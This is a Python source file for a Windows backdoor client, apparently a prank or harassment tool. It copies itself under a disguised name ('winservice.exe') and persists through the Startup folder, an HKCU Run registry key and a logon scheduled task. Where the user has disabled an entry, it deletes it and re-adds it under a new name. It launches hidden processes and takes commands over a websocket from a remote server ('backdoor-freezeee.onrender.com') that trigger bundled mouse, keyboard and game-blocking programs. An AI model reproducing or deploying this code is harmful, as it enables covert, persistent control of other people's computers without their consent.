from time import sleep
from messagehandler import handle_message
import asyncio
from implementations import *
import websockets  # type: ignore
import sys
import os
import winreg
import subprocess
import socket
import shutil

server_url = "wss://backdoor-freezeee.onrender.com"
# server_url = "ws://localhost:8602"

CLIENT_NAME = socket.gethostname()

exe_path = sys.executable

roaming = os.environ["APPDATA"]
target_dir = os.path.join(roaming, "Windows")

new_exe_name = "winservice.exe"
target_exe = os.path.join(target_dir, new_exe_name)

os.makedirs(target_dir, exist_ok=True)

if not os.path.exists(target_exe):
    shutil.copy2(exe_path, target_exe)
    subprocess.Popen(
        [target_exe],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    sys.exit()

def ensure_startup_persistence():
    exe_name = os.path.splitext(os.path.basename(exe_path))[0]
    base_name = exe_name

    startup_folder = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    run_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    # ==========================================================
    # StartupApproved
    # ==========================================================
    def is_enabled(source, name):
        path = rf"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\{source}"
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as key:
                value, _ = winreg.QueryValueEx(key, name)
                return value[0] == 0x02
        except FileNotFoundError:
            return True

    # ==========================================================
    # Nome incremental (IniciarPrograma, IniciarPrograma2, ...)
    # ==========================================================
    def next_incremental_name(existing):
        i = 1
        name = base_name
        while name.lower() in existing:
            i += 1
            name = f"{base_name}{i}"
        return name

    # ==========================================================
    # STARTUP FOLDER
    # ==========================================================
    existing_files = {f.lower() for f in os.listdir(startup_folder)}

    startup_file = f"{base_name}.exe"

    if startup_file.lower() in existing_files:
        if not is_enabled("StartupFolder", startup_file):
            try:
                os.remove(os.path.join(startup_folder, startup_file))
            except OSError:
                pass
            startup_file = f"{next_incremental_name(existing_files)}.exe"

    if startup_file.lower() not in existing_files:
        try:
            shutil.copy2(exe_path, os.path.join(startup_folder, startup_file))
        except OSError:
            pass

    # ==========================================================
    # REGISTRY RUN (HKCU)
    # ==========================================================
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            run_key_path,
            0,
            winreg.KEY_ALL_ACCESS
        ) as key:

            existing_values = set()
            i = 0
            while True:
                try:
                    name, _, _ = winreg.EnumValue(key, i)
                    existing_values.add(name.lower())
                    i += 1
                except OSError:
                    break

            reg_name = base_name

            if reg_name.lower() in existing_values:
                if not is_enabled("Run", reg_name):
                    winreg.DeleteValue(key, reg_name)
                    reg_name = next_incremental_name(existing_values)

            if reg_name.lower() not in existing_values:
                winreg.SetValueEx(
                    key,
                    reg_name,
                    0,
                    winreg.REG_SZ,
                    f'"{exe_path}"'
                )
    except OSError:
        pass

    # ==========================================================
    # SCHEDULED TASK (USER)
    # ==========================================================
    def task_exists(name):
        return subprocess.run(
            ["schtasks", "/query", "/tn", name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        ).returncode == 0

    def task_disabled(name):
        r = subprocess.run(
            ["schtasks", "/query", "/tn", name, "/fo", "LIST"],
            capture_output=True,
            text=True
        )
        return "Disabled" in r.stdout

    def create_task(name):
        subprocess.run(
            [
                "schtasks",
                "/create",
                "/tn", name,
                "/tr", f'"{exe_path}"',
                "/sc", "onlogon",
                "/rl", "limited",
                "/f"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

    task_name = base_name
    i = 1

    while task_exists(task_name):
        if task_disabled(task_name):
            subprocess.run(
                ["schtasks", "/delete", "/tn", task_name, "/f"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            break
        i += 1
        task_name = f"{base_name}{i}"

    if not task_exists(task_name):
        create_task(task_name)

def ensure_persistence():
    threading.Timer(5, ensure_startup_persistence).start()

async def pinger(ws):
    try:
        while True:
            await asyncio.sleep(5)
            await ws.send("PING")
    except asyncio.CancelledError:
        pass
    except Exception:
        pass

block_exe = resource_path("block_inputs.exe")
valorantblock_exe = resource_path("valorantblock.exe")
if not os.path.isfile(block_exe) or not os.path.isfile(valorantblock_exe):
    sys.exit(1)

startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
startupinfo.wShowWindow = subprocess.SW_HIDE

creationflags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP

# geometry_exe = os.path.join(os.path.dirname(sys.executable), "uninstaller.exe")
# if not os.path.isfile(geometry_exe):
#     geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "uninstaller.exe")
#     if not os.path.isfile(geometry_exe):
#         geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "GeometryDash.exe")
#         if not os.path.isfile(geometry_exe):
#             geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "UltimateChickenHorse.exe")
#             if not os.path.isfile(geometry_exe):
#                 geometry_exe = None


# if geometry_exe:
#     try:
#         subprocess.Popen(
#             [geometry_exe],
#             startupinfo=startupinfo,
#             creationflags=creationflags
#         )
#     except Exception:
#         print("Failed to launch uninstaller.exe")

state = {
    "mouse": None,
    "keyboard": None,
    "valorant": None,
}

# if not im_in_startup():
#     hide_file(sys.executable)
#     sleep(3)

ensure_persistence()
# check_reinstall()

async def receiver(ws):
    try:
        async for msg in ws:
            if msg != "PONG":
                handle_message(msg, block_exe, valorantblock_exe, state, startupinfo, creationflags)
    except Exception as e:
        print(f"Receiver exception: {e}")

async def main():
    print("Connecting to server...")
    ws = None

    while True:
        try:
            if ws is None or getattr(ws, "closed", True):
                try:
                    ws = await asyncio.wait_for(
                        websockets.connect(server_url),
                        timeout=1400
                    )
                    print("Connected!")
                except asyncio.TimeoutError:
                    print("Timeout ao conectar")
                    ws = None
                    await asyncio.sleep(5)
                    continue
                except Exception as e:
                    print("Erro ao conectar:", e)
                    ws = None
                    await asyncio.sleep(5)
                    continue

                try:
                    await ws.send(f"HELLO_{CLIENT_NAME}")
                    response = await ws.recv()
                except Exception as e:
                    print("Handshake error:", e)
                    try:
                        await ws.close()
                    except Exception:
                        pass
                    ws = None
                    await asyncio.sleep(5)
                    continue

                print("Received:", response)
                if response != "WELCOME":
                    print("Handshake failed")
                    try:
                        await ws.close()
                    except Exception:
                        pass
                    ws = None
                    await asyncio.sleep(5)
                    continue

                receiver_task = asyncio.create_task(receiver(ws))
                pinger_task = asyncio.create_task(pinger(ws))

                done, pending = await asyncio.wait([receiver_task, pinger_task], return_when=asyncio.FIRST_EXCEPTION)

                for t in pending:
                    t.cancel()

                try:
                    await ws.close()
                except Exception:
                    pass
                ws = None

            else:
                await asyncio.sleep(1)

        except Exception as e:
            print("Connection error:", e)
            try:
                if ws:
                    await ws.close()
            except Exception:
                pass
            ws = None
            await asyncio.sleep(5)

asyncio.run(main())
